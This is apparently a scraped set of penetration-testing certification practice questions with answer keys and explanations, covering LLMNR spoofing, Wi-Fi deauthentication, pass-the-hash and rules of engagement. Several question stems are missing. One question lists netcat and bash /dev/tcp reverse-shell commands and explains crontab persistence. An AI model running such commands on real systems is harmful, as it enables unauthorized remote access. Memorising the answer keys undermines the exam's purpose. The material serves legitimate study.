OBJ-3.1: Windows computers do not rely on DNS for name resolution within the internal networks. Instead, they rely on NetBIOS Name Service (NBNS) queries. Since Windows Vista, though, NBNS queries have been replaced with the Link-Local Multicast Name Resolution (LLMNR) protocol. The Responder tool in Kali Linux is used to conduct NBNS, LLMNR, and DNS name resolution exploits. In this example, Responder is being used to answer the Windows host asking for name resolution for the system called "wpad" but provides the IP for the Kali Linux machine instead of the correct IP. The first highlighted section shows the LLMNR query for the host “wpad” being sent by the Windows 7 host and answered by the Kali host running Responder. The last highlighted section shows the Windows 7 host getting the wpad.dat file by providing their credentials to the Kali host. There are several clues in this question to the right answer. First, the question mentions that you waited 15 minutes. Within Windows networks, the older NetBIOS system, each Windows machine would send out a broadcast message with its IP and WINS name every 10-15 minutes. Some of this functionality remains within LLMNR, too. But, the easier clue to identify is from the Wireshark packet capture. It clearly shows the protocol being used in lines 1212 through 1216 as LLMNR during the query and response. For this question, I was even nice enough to highlight that portion is red, but don't expect the exam to be nearly as kind!

You are conducting a wireless penetration test against an organization. You have been monitoring the WPA2 encrypted network for almost an hour but have been unable to successfully capture a handshake. Which of the following exploits should you use to increase your chances of capturing a handshake?

- 

  Karma attack

- 

  Fragmentation attack

- 

  Downgrade attack

- 

  Deauthentication attack

  (正確)

#### 解釋

OBJ-3.2: Deauthentication attacks are used in the service of an evil twin, replay, cracking, denial of service, and other attacks. All 802.11 Wi-Fi protocols include a management frame that a client can use to announce that it wishes to terminate a connection with an access point. The victim's device will be kicked off the access point by spoofing the victim's MAC address and sending the deauthentication frame to the access point. If the user is still using the network, the wireless adapter will automatically reconnect by sending a handshake to the access point. This allows the attacker to capture the handshake during the reconnection. A fragmentation attack obtains the pseudorandom generation algorithm (PRGA) of network packets used in WEP. A downgrade attack forces a client to use a weaker SSL version that the attacker can crack. A karma attack is a variant of the evil twin attack. A karma attack exploits the behavior of a wireless client trying to connect to its preferred network list. This list contains the SSIDs of access points the device has connected to in the past. When a wireless device is looking to connect to the internet, it firsts beacons to determine if any of these previously connected networks are within range.

As a newly hired cybersecurity analyst, you are attempting to determine your organization's current public-facing attack surface. Which of the following methodologies or tools generates a current and historical view of the company's public-facing IP space?

- 

  shodan.io

  (正確)

- 

  nmap

- 

  Review network diagrams

- 

  Google hacking

#### 解釋

OBJ-2.1: Shodan (shodan.io) is a search engine that identifies Internet-connected devices of all types. The engine uses banner grabbing to identify the type of device, firmware/OS/app type, and version, plus vendor and ID information. This involves no direct interaction with the company's public-facing internet assets since this might give rise to detection. This is also the first place an adversary might use to conduct reconnaissance on your company's network. The nmap scanning tool can provide an analysis of the current state of public exposure but has no mechanism to determine the history, nor will it give the same depth of information that shodan.io provides. Google Hacking can determine if a public exposure occurred over public-facing protocols, but it cannot conclusively reveal all the exposures present. Google hacking relies on using advanced Google searches with advanced syntax to search for information across the internet. Network diagrams can show how a network was initially configured. Unless the diagrams are up-to-date, which they usually aren't, they cannot show the current "as is" configuration. If you can only select one tool to find your attack surface's current and historical view, shodan is your best choice.

  Credential harvesting

- 

  Pass the hash

  (正確)

- 

  Credential brute forcing

- 

  Sandbox escape

#### 解釋

OBJ-3.1: A pass the hash attack is a network-based attack where the attacker steals hashed user credentials and uses them as-is to try to authenticate to the same network the hashed credentials originated on. When authenticating with a username and password, the password is hashed once you type it in. Therefore, the computer doesn't recognize a difference between the password and the hash itself. So, if you use psexec to send the hash to the system directly, it can be used to authenticate you as that user without actually knowing the user's password. The key to answering this question is identifying that the smbpass parameter is being set to a password hash of a specified user.

Dion Training is afraid that an attacker might try to send other types of network traffic over port 80 to bypass their security policies. Which of the following should they implement to prevent unauthorized traffic from entering through the firewall?

- 

  Stateful packet inspection

- 

  Stateless packet inspection

- 

  HTTPS (SSL/TLS)

- 

  Application-aware firewall

  (正確)

#### 解釋

OBJ-4.2: An application-aware firewall can make decisions about what applications are allowed or blocked by a firewall, as opposed to simply using IP addresses and port numbers, by applications by inspecting the data contained within the packets. A stateless packet inspection firewall allows or denies packets into the network based on the source and destination IP address or the traffic type (TCP, UDP, ICMP, etc.). A stateful packet inspection firewall monitors the active sessions and connections on a network. The process of stateful inspection determines which network packets should be allowed through the firewall by utilizing the information it gathered regarding active connections as well as the existing ACL rules. Neither a stateless nor stateful inspection firewall operates at layer 6 or layer 7, so they cannot inspect the contents of the packet to ensure it contains HTTP traffic and not other types of network traffic. HTTPS (SSL/TLS) would allow for an encrypted communication path between the webserver and the client, but this would not prevent an attacker from sending other network protocol data over port 80 and bypassing the firewall rules.

Before the penetration tester runs that command, what must they run first on their machine?

- 

  bash 0>& /dev/tcp/127.0.0.1/31337 1>&0

- 

  nc -e /bin/sh 192.168.1.53 31337

- 

  nc -nlvp 31337

  (正確)

- 

  nc 192.168.1.53 31337

#### 解釋

OBJ-3.7: The bash command entered by the penetration tester on the Dion Training server is a redirector to send information back to a listener. Therefore, the penetration tester needs to first set up a listener on their machine. This can quickly be done using netcat to set up a listener on port 31337 (nc -nvlp 31337). The bash command says to redirect the standard output (0) to a TCP socket connected to the IP (192.168.1.53) over port 31337. Then, the standard input (0) is redirected to the standard output (1). Since Bash treats TCP sockets established using this command as a two-way connection, it allows the penetration tester to gain a remote connection to the server by creating a reverse shell. To maintain persistence, the server could be configured using crontab to run this Bash command every day at a certain time, as well.

Why must you have an established communication path and a client's emergency point of contact during a penetration test?

- 

  To report that a production server is unresponsive

  (正確)

- 

  To inform them of a security patch update

- 

  To provide a summary of daily events

- 

  To provide published vulnerability updates

#### 解釋

OBJ-4.3: If a server becomes unresponsive during a penetration test, the team should pause their work and immediately inform the client's emergency point of contact. The penetration testing team should have a direct communication path with the system owners or their trusted agents during an engagement. If the team discovers any security breaches, current hacking activity, extremely critical findings on a production server, or a production server becomes unresponsive during exploitation, then the team should stop what they are doing and contract their trusted point of contact within the organization to get further guidance. The trusted agents and communication paths should be determined when planning the engagement.

問題 78：

Which of the following rules of engagement provides the scope and limitation of the penetration test?

- 

  Location of the team

- 

  Test boundaries

  (正確)

- 

  Temporal restrictions

- 

  Timeline

#### 解釋

OBJ-1.2: The test boundaries are used to define the acceptable actions and scope used during an engagement. For example, it will define whether servers, endpoints, or both will be in the scope of the attack. It may also dictate whether only technical means may be used for exploitation or if social engineering can also be utilized. The location of the team defines whether the penetration testers will conduct a remote or on-site assessment. The timeline of an engagement provides a clear enumeration of the tasks to be performed as part of the penetration test. Temporal restrictions provide the constraints for which days and times the penetration test can be performed.

During her login session, Sally is asked by the system for a code sent to her via text (SMS) message. Which of the following concerns should she raise to her organization’s AAA services manager?

- 

  SMS should be paired with a third factor

- 

  SMS messages may be accessible to attackers via VoIP or other systems

  (正確)

- 

  SMS should be encrypted to be secure

- 

  SMS is a costly method of providing a second factor of authentication

#### 解釋

OBJ-3.4: NIST’s SP 800-63-3 recommends that SMS messages be deprecated as a means of delivering a second factor for multifactor authentication because they may be accessible to attackers. SMS is unable to be encrypted (at least without adding additional applications to phones). A third factor is typically not a user-friendly recommendation and would be better handled by replacing SMS with the proposed third factor. SMS is not a costly method since it can be deployed for less than $20/month at scale.

Dion Training is worried about the security of the data on their corporate smartphones if lost or stolen. The Chief Security Officer has instructed that the devices be configured so that unauthorized users cannot access the data. Which TWO of the following settings would provide the BEST security and protection for the corporate smartphones' data?

- 

  Require complex passwords

- 

  Enable full device encryption

  (正確)

- 

  Configure the ability to perform a remote wipe

  (正確)

- 

  Enable device lockouts after 3 failed attempts

- 

  Enable a pattern lock

- 

  Disable the installation of applications from untrusted sources

#### 解釋

OBJ-4.2: The BEST protections for the data would involve enabling full disk encryption and configuring the ability to perform a remote wipe. Even if the device is lost or stolen, its data would be unreadable if it was using full disk encryption. Additionally, by configuring the ability to wipe the device's storage remotely, the data would be erased before a thief can access it. The other options are all valid options to increase security, but they do not directly address the issues presented in the scenario.

During a penetration test, you find a hash value related to malware associated with an APT. What best describes what you have found?

- 

  Botnet

- 

  Indicator of compromise

  (正確)

- 

  SQL injection

- 

  XSRF

#### 解釋

OBJ-4.3: An indicator of compromise is an artifact observed on a network or in an operating system that, with high confidence, indicates a computer intrusion. Typical IOCs are virus signatures and IP addresses, MD5 hashes of malware files or URLs, or botnet command and control servers' domain names. SQL injection is a code injection technique used to attack data-driven applications. Malicious SQL statements are inserted into an entry field for execution, such as dumping the database contents to the attacker. Cross-site request forgery (CSRF or XSRF) is a malicious exploit of a website where unauthorized commands are transmitted from a user that the web application trusts. There are many ways in which a malicious website can transmit commands, such as specially-crafted image tags, hidden forms, and JavaScript XMLHttpRequests can all work without the user's interaction or even knowledge. A botnet consists of many Internet-connected devices, each of which is running one or more bots. Botnets can be used to perform Distributed Denial-of-Service (DDoS) attacks, steal data, send spam, and allow the attacker to access the device and its connection.

Dion Consulting Group has hired a new penetration tester to work on an upcoming engagement. The company that hired Dion Consulting has carefully constructed a scoping document that has set the boundaries for the engagement. Which of the following could occur if the new penetration tester conducts actions that are outside of the scope of the agreed-upon contract? (Select ANY that apply)

- 

  Voiding of the initial contract by the company

  (正確)

- 

  Fines levied against the penetration tester

  (正確)

- 

  Fees levied against Dion Consulting

  (正確)

- 

  Criminal charges against the penetration tester

  (正確)

#### 解釋

OBJ-1.3: Penetration testers must be careful to conduct their activities within the boundaries of the negotiated contract and scoping documents. If the penetration tester conducts activities outside of the authorized scope, they could be fined or their company could have fees levied against it. Even worse, depending on the local, state, and country laws in the location where they are operating, the penetration tester could have criminal charges issued against them for unlawful hacking. The initial contract would not be voided by the company since a contract cannot be unilaterally voided by a single party of the contract.

Which of the following methodologies or frameworks provides a matrix that describes the different tasks conducted by an attacker or penetration tester during an engagement?

- 

  Open Source Security Testing Methodology Manual (OSSTMM)

- 

  Penetration Testing Execution Standard (PTES)

- 

  Information Systems Security Assessment Framework (ISSAF)

- 

  MITRE ATT&CK framework

  (正確)

#### 解釋

OBJ-1.2: The MITRE ATT&CK (Adversarial Tactics, Techniques & Common Knowledge) framework provides tools and techniques displayed as columns in a matrix that describe different tasks conducted by an attacker or penetration tester during an engagement. The Penetration Testing Execution Standard (PTES) was developed by business professionals as a best practice guide for conducting penetration testing. The PTES contains seven main sections that are used to provide a comprehensive overview of the proper structure of a complete penetration test. The Open Source Security Testing Methodology Manual (OSSTMM) was developed by the Institute for Security and Open Methodologies (ISECOM) and it outlines every area of an organization that needs testing and how to conduct the relevant tests. The Information Systems Security Assessment Framework (ISSAF) is an open-source resource available to cybersecurity professionals. The ISSAF is comprised of documents that relate to penetration testing, such as guidelines on business continuity and disaster recovery along with legal and regulatory compliance.

You have just conducted an automated vulnerability scan against a static webpage without any user input fields. You have been asked to adjudicate the scanner's findings in the automated report. Which of the following is MOST likely to be a false positive?

- 

  Insecure HTTP methods allowed

- 

  Reflected XSS

- 

  Command injection allowed

  (正確)

- 

  Directory listing enabled

#### 解釋

OBJ-2.4: A command injection is unlikely since this is a static webpage and does not accept any user input. A command injection allows the user to supply malicious input to the web server and then passes that data to a system shell for execution. In this sense, command injection does create new instances of execution and can, therefore, leverage languages that the web app does not directly support.

  Bash

  (正確)

- 

  Python

#### 解釋

OBJ-5.1: You should be able to identify a script or programming language based on a code snippet for the exam. PowerShell uses keywords like Write-Host to output text to the display. Python uses keywords like print to output text to the display. Bash uses keywords like echo to output text to the display. You are not expected to be able to write programs or scripts for the exam, but you must be able to read, analyze, and understand their basic functionality.

You are working as part of a penetration testing team conducting active reconnaissance. You have just conducted a Nmap scan and received the following results:

![img](https://img-c.udemycdn.com/redactor/raw/quiz_question/2022-01-17_05-25-11-2f5e969b7a9a623817f06270f3c91ace.jpg)

Which of the options did you use when running this scan to generate these results?

- 

  -sS

- 

  -A

- 

  -script=vuln

  (正確)

- 

  -p

  (正確)

- 

  -O

#### 解釋

OBJ-2.4: This result was produced by using the command "nmap -script=vuln -p139,445 192.168.0.18". The -script=vuln option indicates that Nmap should use the Nmap Scripting Engine (NSE) script for vulnerability detection against the specified target. The -p option indicates that Nmap should only scan the specified ports. In this example, ports 139 and 445 are scanned because they must be open for the MS17-010 vulnerability to exist on the target server. The -O option is used to conduct operating system detection and there is no evidence this was run based on the output. The -A option enables operating system detection and version detection, as well as script scanning and traceroute. There is no evidence in the output that -A was utilized in running the command.

A security analyst conducts a Nmap scan of a server and found that port 25 is open. What risk might this server be exposed to?

- 

  Clear text authentication

- 

  Open mail relay

  (正確)

- 

  Web portal data leak

- 

  Open file/print sharing

#### 解釋

OBJ-2.3: Port 25 is the default port for SMTP (Simple Message Transfer Protocol), which is used for sending an email. An active mail relay occurs when an SMTP server is configured in such a way that it allows anyone on the Internet to send email through it, not just mail originating from your known and trusted users. Spammers can exploit this type of vulnerability to use your email server for their benefit. File/print sharing usually operates over ports 135, 139, and 445 on a Windows server. Web portals run on ports 80 and 443. Clear text authentication could occur using an unencrypted service, such as telnet (23), FTP (20/21), or the web (80).

During a penetration test of your company’s network, the assessor came across a spreadsheet with the passwords being used for several servers. Four of the passwords recovered are listed below. Which one is the weakest password and should be changed FIRST to increase the password’s complexity?

- 

  Pa55w0rd

- 

  P@$$w0rd

- 

  P@$$W0RD

- 

  pa55word

  (正確)

#### 解釋

OBJ-4.2: Password policies often enforce a mixture of standard character types, including uppercase letters, lowercase letters, numbers, and symbols. The option ‘pa55word’ is the weakest choice since it only includes lowercase letters and numbers. The option ‘Pa55w0rd’ is slightly more complex since it includes uppercase letters, lowercase letters, and numbers. The option ‘P@$$W0RD is also similar in complexity since it includes uppercase letters, numbers, and special characters. The most secure option is ‘P@5$w0rd’ since it includes a mixture of uppercase letters, lowercase letters, numbers, and special characters.

You are working as a penetration tester conducting an engagement against Dion Training's network. You have just conducted a successful exploit of the company's Active Directory server. A few minutes later, you receive a call from the company's trusted agent asking if you have just created a new administrative user named "TheMightOne" in their domain controller. You tell the agent that you did, and he says, "Ok, I will wait to see how long it takes for my team to notice it on their own." Which of the following BEST describes this scenario?

- 

  De-escalation

- 

  Goal reprioritization

- 

  Situational Awareness

- 

  De-confliction

  (正確)

#### 解釋

OBJ-4.3: De-confliction is the process of avoiding an early conclusion to an engagement by coordinating the penetration testing team's efforts amongst themselves or with a few key trusted personnel in the client organization. If the penetration tester did not create the account, then the trusted agent would have begun an incident response to hunt down and clear the cause of a new administrative account being created. If this occurred, the penetration test would have been stopped or paused during this incident response.

An attacker is using a precomputed table of values to attempt to crack your Windows password. What type of password attack is this?

- 

  Hybrid

- 

  Brute-force

- 

  Rainbow table

  (正確)

- 

  Dictionary

#### 解釋

OBJ-3.1: A rainbow table is a tool for speeding up attacks against Windows passwords by precomputing possible hashes. A rainbow table is used to authenticate users by comparing the hash value of the entered password against the one stored in the rainbow table. Using a rainbow table makes password cracking a lot faster and easier for an attacker. A dictionary attack is a technique for defeating a cipher or authentication mechanism by trying to determine its decryption key or passphrase by trying hundreds or sometimes millions of likely possibilities, such as words in a dictionary. A brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. A hybrid attack combines a dictionary list with the ability to add brute-force combinations to crack a password that is slightly different than the dictionary list entry.
